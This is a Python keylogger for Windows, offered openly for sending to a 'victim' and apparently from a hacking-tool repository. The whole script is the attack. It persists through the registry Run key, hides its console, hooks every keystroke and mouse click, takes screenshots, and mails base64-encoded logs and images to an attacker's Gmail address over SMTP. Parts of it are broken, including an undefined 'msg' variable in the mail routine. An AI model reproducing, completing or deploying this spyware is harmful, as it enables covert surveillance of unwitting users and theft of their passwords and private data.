#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
.d88888b                             oo   dP            
88.    "'                                 88            
`Y88888b. .d8888b. dP    dP 88d888b. dP d8888P dP    dP 
      `8b 88'  `88 88    88 88'  `88 88   88   88    88 
d8'   .8P 88.  .88 88.  .88 88    88 88   88   88.  .88 
 Y88888P  `8888P88 `88888P' dP    dP dP   dP   `8888P88 
                88                                  .88 
                dP                              d8888P 
"""

import sys
import win32api,pythoncom
import pyHook,os,time,random,smtplib,string,base64
from _winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]


#Note: You have to edit this part from sending the keylogger to the victim

#########Settings########

yourgmail=""                                        #What is your gmail?
yourgmailpass=""                                    #What is your gmail password
sendto=""                                           #Where should I send the logs to? (any email address)
interval=60                                         #Time to wait before sending data to email (in seconds)

########################

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()


def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
               new_file_path)


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

addStartup()

Hide()


def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


def Mail_it(data, pics_names):
    data = base64.b64encode(data)
    data = 'New data from victim(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(open(pic, 'r+').read())
        data = 'New pic data from victim(Base64 encoded)\n' + data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, msg.as_string())
        server.close()


def OnMouseEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
